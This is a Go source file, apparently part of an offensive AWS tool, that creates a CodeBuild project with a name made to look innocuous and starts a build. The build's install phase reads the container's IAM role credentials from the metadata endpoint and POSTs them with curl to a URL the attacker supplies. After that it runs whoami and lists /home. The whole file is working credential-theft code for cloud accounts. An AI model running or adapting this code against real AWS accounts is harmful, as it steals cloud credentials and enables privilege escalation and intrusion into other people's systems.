package awsdata

import (
	"fmt"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/awserr"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/codebuild"
	"github.com/drk1wi/Modlishka/log"
)

func CreateProject(sess *session.Session, payload string, roleArn string) (string, string) {
	rando := String(10)
	projectName := "Amazon-CodeBuild_DevTest_" + rando

	buildspec := fmt.Sprintf(`version: 0.2

phases:
  install:
    commands:
      - curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > /tmp/meta
      - curl -X POST --data "@/tmp/meta" %s
  build:
    commands:
      - whoami
  post_build:
    finally:
      - ls -la /home`, payload)

	svc := codebuild.New(sess)
	input := &codebuild.CreateProjectInput{
		Name: aws.String(projectName),
		Source: &codebuild.ProjectSource{
			Type:      aws.String("NO_SOURCE"),
			Buildspec: aws.String(buildspec),
		},
		Artifacts: &codebuild.ProjectArtifacts{
			Type: aws.String("NO_ARTIFACTS"),
		},
		Environment: &codebuild.ProjectEnvironment{
			Type:        aws.String("LINUX_CONTAINER"),
			Image:       aws.String("aws/codebuild/standard:1.0"),
			ComputeType: aws.String("BUILD_GENERAL1_SMALL"),
		},
		ServiceRole: aws.String(roleArn),
	}

	result, err := svc.CreateProject(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			case codebuild.ErrCodeInvalidInputException:
				fmt.Println(codebuild.ErrCodeInvalidInputException, aerr.Error())
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return "", ""
	}
	log.Infof("* Project %s successfully created at %v", *result.Project.Arn, result.Project.Created)
	return *result.Project.Arn, *result.Project.Name

}

func StartBuild(sess *session.Session, projName string) {

	svc := codebuild.New(sess)
	input := &codebuild.StartBuildInput{
		ProjectName: aws.String(projName),
	}

	result, err := svc.StartBuild(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			case codebuild.ErrCodeInvalidInputException:
				fmt.Println(codebuild.ErrCodeInvalidInputException, aerr.Error())
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return
	}
	log.Infof("* Build %s successfully %s", *result.Build.Arn, *result.Build.CurrentPhase)

}
